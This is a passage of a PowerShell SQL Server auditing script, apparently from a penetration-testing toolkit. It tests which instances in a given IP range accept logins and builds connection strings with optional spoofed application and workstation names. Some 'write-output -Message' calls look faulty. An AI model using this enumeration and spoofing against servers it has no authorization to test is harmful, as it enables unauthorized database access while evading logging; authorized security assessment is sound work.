        # Split Demarkation Start ^
        # Parse computer name from the instance
        $ComputerName = Get-ComputerNameFromInstance -Instance $Instance

        if($IPRange -and $IPAddress)
        {
            if ($IPAddress.Contains(","))
            {
                $ContainsValid = $false
                foreach ($IP in $IPAddress.Split(","))
                {
                    if($(Test-Subnet -cidr $IPRange -ip $IP))
                    {
                        $ContainsValid = $true
                    }
                }
                if (-not $ContainsValid)
                {
                    Write-Warning "Skipping $ComputerName ($IPAddress)"
                    $null = $TblResults.Rows.Add("$ComputerName","$Instance",'Out of Scope')
                    return
                }
            }

            if(-not $(Test-Subnet -cidr $IPRange -ip $IPAddress))
            {
                Write-Warning "Skipping $ComputerName ($IPAddress)"
                $null = $TblResults.Rows.Add("$ComputerName","$Instance",'Out of Scope')
                return
            }
            write-output "$ComputerName ($IPAddress)"
        }

        # Setup DAC string
        if($DAC)
        {
            # Create connection object
            $Connection = Get-SQLConnectionObject -Instance $Instance -Username $Username -Password $Password -Credential $Credential -DAC -TimeOut $TimeOut -Database $Database
        }
        else
        {
            # Create connection object
            $Connection = Get-SQLConnectionObject -Instance $Instance -Username $Username -Password $Password -Credential $Credential -TimeOut $TimeOut -Database $Database
        }

        # Attempt connection
        try
        {
            # Open connection
            $Connection.Open()

            if(-not $SuppressVerbose)
            {
                write-output -Message "$Instance : Connection Success."
            }

            # Add record
            $null = $TblResults.Rows.Add("$ComputerName","$Instance",'Accessible')

            # Close connection
            $Connection.Close()

            # Dispose connection
            $Connection.Dispose()
        }
        catch
        {
            # Connection failed
            if(-not $SuppressVerbose)
            {
                $ErrorMessage = $_.Exception.Message
                write-output -Message "$Instance : Connection Failed."
                write-output  -Message " Error: $ErrorMessage"
            }

            # Add record
            $null = $TblResults.Rows.Add("$ComputerName","$Instance",'Not Accessible')
        }
    }

    End
    {
        # Return Results
        $TblResults
    }
}
Function Get-SQLConnectionObject
{

    [CmdletBinding()]
    Param(
        [Parameter(Mandatory = $false,
        HelpMessage = 'SQL Server or domain account to authenticate with.')]
        [string]$Username,

        [Parameter(Mandatory = $false,
        HelpMessage = 'SQL Server or domain account password to authenticate with.')]
        [string]$Password,

        [Parameter(Mandatory = $false,
        HelpMessage = 'Windows credentials.')]
        [System.Management.Automation.PSCredential]
        [System.Management.Automation.Credential()]$Credential = [System.Management.Automation.PSCredential]::Empty,

        [Parameter(Mandatory = $false,
                ValueFromPipelineByPropertyName = $true,
        HelpMessage = 'SQL Server instance to connection to.')]
        [string]$Instance,

        [Parameter(Mandatory = $false,
        HelpMessage = 'Dedicated Administrator Connection (DAC).')]
        [Switch]$DAC,

        [Parameter(Mandatory = $false,
        HelpMessage = 'Default database to connect to.')]
        [String]$Database,

        [Parameter(Mandatory = $false,
        HelpMessage = 'Spoof the name of the application your connecting to the server with.')]
        [string]$AppName = "",

        [Parameter(Mandatory = $false,
        HelpMessage = 'Spoof the name of the workstation/hostname your connecting to the server with.')]
        [string]$WorkstationId = "",

        [Parameter(Mandatory = $false,
        HelpMessage = 'Use an encrypted connection.')]
        [ValidateSet("Yes","No","")]
        [string]$Encrypt = "",

        [Parameter(Mandatory = $false,
        HelpMessage = 'Trust the certificate of the remote server.')]
        [ValidateSet("Yes","No","")]
        [string]$TrustServerCert = "",

        [Parameter(Mandatory = $false,
        HelpMessage = 'Connection timeout.')]
        [string]$TimeOut = 1
    )

    Begin
    {
        # Setup DAC string
        if($DAC)
        {
            $DacConn = 'ADMIN:'
        }
        else
        {
            $DacConn = ''
        }

        # Set database filter
        if(-not $Database)
        {
            $Database = 'Master'
        }

        # Check if appname was provided
        if($AppName){
            $AppNameString = ";Application Name=`"$AppName`""
        }else{
            $AppNameString = ""
        }

        # Check if workstationid was provided
        if($WorkstationId){
            $WorkstationString = ";Workstation Id=`"$WorkstationId`""
        }else{
            $WorkstationString = ""
        }

        # Check if encrypt was provided
        if($Encrypt){
            $EncryptString = ";Encrypt=Yes"
        }else{
            $EncryptString = ""
        }

        # Check TrustServerCert was provided
        if($TrustServerCert){
            $TrustCertString = ";TrustServerCertificate=Yes"
        }else{
            $TrustCertString = ""
        }
    }

    Process
    {
        # Check for instance
        if ( -not $Instance)
        {
            $Instance = $env:COMPUTERNAME
        }

        # Create connection object
        $Connection = New-Object -TypeName System.Data.SqlClient.SqlConnection

        # Set authentcation type - current windows user
        if(-not $Username){

            # Set authentication type
            $AuthenticationType = "Current Windows Credentials"

            # Set connection string
            $Connection.ConnectionString = "Server=$DacConn$Instance;Database=$Database;Integrated Security=SSPI;Connection Timeout=$TimeOut$AppNameString$EncryptString$TrustCertString$WorkstationString"
        }
        
        # Set authentcation type - provided windows user
        if ($username -like "*\*"){
            $AuthenticationType = "Provided Windows Credentials"

            # Setup connection string 
            $Connection.ConnectionString = "Server=$DacConn$Instance;Database=$Database;Integrated Security=SSPI;uid=$Username;pwd=$Password;Connection Timeout=$TimeOut$AppNameString$EncryptString$TrustCertString$WorkstationString"
        }

        # Set authentcation type - provided sql login
        if (($username) -and ($username -notlike "*\*")){

            # Set authentication type
            $AuthenticationType = "Provided SQL Login"

            # Setup connection string 
            $Connection.ConnectionString = "Server=$DacConn$Instance;Database=$Database;User ID=$Username;Password=$Password;Connection Timeout=$TimeOut$AppNameString$EncryptString$TrustCertString$WorkstationString"
        }

        # Return the connection object
        return $Connection
    }

    End
    {
    }
}
get-sqlserverpolicy
write-output "END OF RUN"
